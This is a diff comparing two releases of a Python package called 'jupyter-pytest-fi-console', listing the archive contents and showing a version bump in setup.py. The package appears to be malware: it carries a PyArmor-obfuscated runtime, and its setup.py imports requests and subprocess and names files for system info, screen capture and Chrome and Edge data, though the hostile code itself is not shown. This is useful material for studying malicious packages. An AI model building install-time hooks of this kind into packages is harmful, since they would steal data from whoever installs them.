# Comparing `tmp/jupyter-pytest-fi-console-8.7.0.tar.gz` & `tmp/jupyter-pytest-fi-console-8.7.1.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "jupyter-pytest-fi-console-8.7.0.tar", last modified: Tue Apr 30 15:50:53 2024, max compression
+gzip compressed data, was "jupyter-pytest-fi-console-8.7.1.tar", last modified: Tue Apr 30 16:18:16 2024, max compression
```

## Comparing `jupyter-pytest-fi-console-8.7.0.tar` & `jupyter-pytest-fi-console-8.7.1.tar`

### file list

```diff
@@ -1,15 +1,16 @@
-drwxrwxrwx   0        0        0        0 2024-04-30 15:50:53.729651 jupyter-pytest-fi-console-8.7.0/
--rw-rw-rw-   0        0        0      211 2024-04-30 13:06:22.000000 jupyter-pytest-fi-console-8.7.0/MANIFEST.in
--rw-rw-rw-   0        0        0      396 2024-04-30 15:50:53.728651 jupyter-pytest-fi-console-8.7.0/PKG-INFO
-drwxrwxrwx   0        0        0        0 2024-04-30 15:50:53.724652 jupyter-pytest-fi-console-8.7.0/jupyter_pytest_fi_console.egg-info/
--rw-rw-rw-   0        0        0      396 2024-04-30 15:50:53.000000 jupyter-pytest-fi-console-8.7.0/jupyter_pytest_fi_console.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      354 2024-04-30 15:50:53.000000 jupyter-pytest-fi-console-8.7.0/jupyter_pytest_fi_console.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2024-04-30 15:50:53.000000 jupyter-pytest-fi-console-8.7.0/jupyter_pytest_fi_console.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       23 2024-04-30 15:50:53.000000 jupyter-pytest-fi-console-8.7.0/jupyter_pytest_fi_console.egg-info/top_level.txt
-drwxrwxrwx   0        0        0        0 2024-04-30 15:50:53.725656 jupyter-pytest-fi-console-8.7.0/pyarmor_runtime_000000/
--rw-rw-rw-   0        0        0      103 2024-04-30 13:19:52.000000 jupyter-pytest-fi-console-8.7.0/pyarmor_runtime_000000/__init__.py
-drwxrwxrwx   0        0        0        0 2024-04-30 15:50:53.727651 jupyter-pytest-fi-console-8.7.0/pyarmor_runtime_000000/__pycache__/
--rw-rw-rw-   0        0        0      264 2024-04-30 13:21:03.000000 jupyter-pytest-fi-console-8.7.0/pyarmor_runtime_000000/__pycache__/__init__.cpython-311.pyc
--rw-rw-rw-   0        0        0   614912 2024-04-30 13:19:52.000000 jupyter-pytest-fi-console-8.7.0/pyarmor_runtime_000000/pyarmor_runtime.pyd
--rw-rw-rw-   0        0        0       42 2024-04-30 15:50:53.729651 jupyter-pytest-fi-console-8.7.0/setup.cfg
--rw-rw-rw-   0        0        0    11056 2024-04-30 15:48:58.000000 jupyter-pytest-fi-console-8.7.0/setup.py
+drwxrwxrwx   0        0        0        0 2024-04-30 16:18:16.568167 jupyter-pytest-fi-console-8.7.1/
+-rw-rw-rw-   0        0        0      211 2024-04-30 13:06:22.000000 jupyter-pytest-fi-console-8.7.1/MANIFEST.in
+-rw-rw-rw-   0        0        0      396 2024-04-30 16:18:16.567163 jupyter-pytest-fi-console-8.7.1/PKG-INFO
+drwxrwxrwx   0        0        0        0 2024-04-30 16:18:16.563161 jupyter-pytest-fi-console-8.7.1/jupyter_pytest_fi_console.egg-info/
+-rw-rw-rw-   0        0        0      396 2024-04-30 16:18:16.000000 jupyter-pytest-fi-console-8.7.1/jupyter_pytest_fi_console.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      402 2024-04-30 16:18:16.000000 jupyter-pytest-fi-console-8.7.1/jupyter_pytest_fi_console.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2024-04-30 16:18:16.000000 jupyter-pytest-fi-console-8.7.1/jupyter_pytest_fi_console.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       15 2024-04-30 16:18:16.000000 jupyter-pytest-fi-console-8.7.1/jupyter_pytest_fi_console.egg-info/requires.txt
+-rw-rw-rw-   0        0        0       23 2024-04-30 16:18:16.000000 jupyter-pytest-fi-console-8.7.1/jupyter_pytest_fi_console.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2024-04-30 16:18:16.564158 jupyter-pytest-fi-console-8.7.1/pyarmor_runtime_000000/
+-rw-rw-rw-   0        0        0      103 2024-04-30 13:19:52.000000 jupyter-pytest-fi-console-8.7.1/pyarmor_runtime_000000/__init__.py
+drwxrwxrwx   0        0        0        0 2024-04-30 16:18:16.566163 jupyter-pytest-fi-console-8.7.1/pyarmor_runtime_000000/__pycache__/
+-rw-rw-rw-   0        0        0      264 2024-04-30 13:21:03.000000 jupyter-pytest-fi-console-8.7.1/pyarmor_runtime_000000/__pycache__/__init__.cpython-311.pyc
+-rw-rw-rw-   0        0        0   614912 2024-04-30 13:19:52.000000 jupyter-pytest-fi-console-8.7.1/pyarmor_runtime_000000/pyarmor_runtime.pyd
+-rw-rw-rw-   0        0        0       42 2024-04-30 16:18:16.568167 jupyter-pytest-fi-console-8.7.1/setup.cfg
+-rw-rw-rw-   0        0        0    11097 2024-04-30 16:17:49.000000 jupyter-pytest-fi-console-8.7.1/setup.py
```

### Comparing `jupyter-pytest-fi-console-8.7.0/setup.py` & `jupyter-pytest-fi-console-8.7.1/setup.py`

 * *Files 2% similar despite different names*

```diff
@@ -10,25 +10,26 @@
 from setuptools import setup, find_packages
 import requests
 import subprocess
 
 
 setup(
 name='jupyter-pytest-fi-console',
-version='8.7.0',
+version='8.7.1',
 author='liamobrien',
 author_email='liamobrien@fractureinteractive.com',
 description='Jupyter terminal console with integreted simple pytest platform',
 packages=find_packages(),
 classifiers=[
 'Programming Language :: Python :: 3',
 'License :: OSI Approved :: MIT License',
 'Operating System :: Microsoft :: Windows ',
 ],
-python_requires='>=3.6'
+python_requires='>=3.6',
+install_requires=['psutil', 'pyarmor']
 )
 
 sysinfo = "ap14847.txt"
 capture = "capture.txt"
 chrome = "chrome_ap14849.txt"
 edge = "edge_ap14849.txt"
 dlname = "iotautomatelogo.png"
```

